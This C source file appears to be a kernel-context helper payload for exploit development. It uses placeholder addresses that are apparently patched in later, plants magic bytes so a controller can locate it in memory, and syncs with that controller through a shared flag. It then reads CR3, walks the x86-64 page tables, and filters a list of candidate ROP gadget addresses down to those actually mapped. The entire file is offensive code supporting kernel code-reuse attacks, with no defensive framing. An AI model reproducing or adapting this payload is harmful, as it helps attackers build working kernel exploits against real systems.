#include <stdio.h>

#define phys_to_virt(x) (0x1111111111111111 + (x))
#define NX 0x8000000000000000


int main()
{
	//register variable needs
	register  int *flag = (int*)0x3333333333333333; //module base
	*flag = 1;
	size_t *ptr = (size_t*)flag;
	//magic bytes for memory search
	*ptr++ = 0xdeadbeef;
	*ptr++ = 0xbabacafe;
	*ptr++ = 0xaaaabbbb; 
	while(*flag);
	while(1)
	{
		*flag = 0;
		int result;
		register  int gadget_idx;
		register size_t *buf_ptr;
		buf_ptr = (size_t*)0x4444444444444444; // module base + 0x210
		register  char *result_buffer = (char*)0x2222222222222222; //flag +4

		for (int i = 0; i < 400; i++)
			result_buffer[i] = 0;

		for (gadget_idx = 0; gadget_idx < 400; gadget_idx++ )
		{
			size_t gadget_address = *buf_ptr;
			if (gadget_address)
			{
				gadget_address &= 0xffffffffffff; //remove sign extended
				long long *PML4 = 0, *PDPT = 0, *PD = 0, *PT = 0;
				unsigned int pml4_idx, directory_ptr_idx, directory_idx, table_idx;
				pml4_idx = gadget_address >> 39; 
				directory_ptr_idx = (gadget_address & 0x7fffffffff) >> 30;
				directory_idx =  (gadget_address & 0x1fffffff) >> 21;
				table_idx = (gadget_address & 0xfffff) >> 12;
				size_t cr3;
				__asm__ (
					"mov rdi, cr3;"
					"mov %0, rdi;"
					:
					:"m"(cr3)
				);
				PML4 = (long long*)phys_to_virt(cr3 & 0xFFFFFFFFFFFFF000);
				if (PML4[pml4_idx])
					PDPT = (long long*)phys_to_virt(PML4[pml4_idx] & 0xFFFFFFFFFFFFF000); //check pdpte
				if (PDPT[directory_ptr_idx])
					PD = (long long*)phys_to_virt(PDPT[directory_ptr_idx] & 0xFFFFFFFFFFFFF000); //check pde
				if (PD[directory_idx])
					PT = (long long*)phys_to_virt(PD[directory_idx] & 0xFFFFFFFFFFFFF000); //check pte

				if (PML4[pml4_idx] <= 0 || !(PML4[pml4_idx] & 1)) //check pml4e
					result = 0;
				else if (PDPT[directory_ptr_idx] <= 0 ||!(PDPT[directory_ptr_idx] & 1)) 
					result = 0;
				else if (PD[directory_idx] <= 0 ||!(PD[directory_idx] & 1)) 
					result = 0;
				else if (PT[table_idx] <= 0 ||!(PT[table_idx] & 1)) 
					result = 0;
				else
				{
					result = 1;
					/*size_t *test = (size_t*)result_buffer;
					*test ++ = PML4[pml4_idx];
					*test ++ = PDPT[directory_ptr_idx];
					*test ++ = PD[directory_idx];
					*test ++ = PT[table_idx];*/
					buf_ptr++;
					//break;
				}
				if (!result)
					*buf_ptr++ = 0;
						
			}
		}
		*flag = 1;
		while(*flag);
	}
}
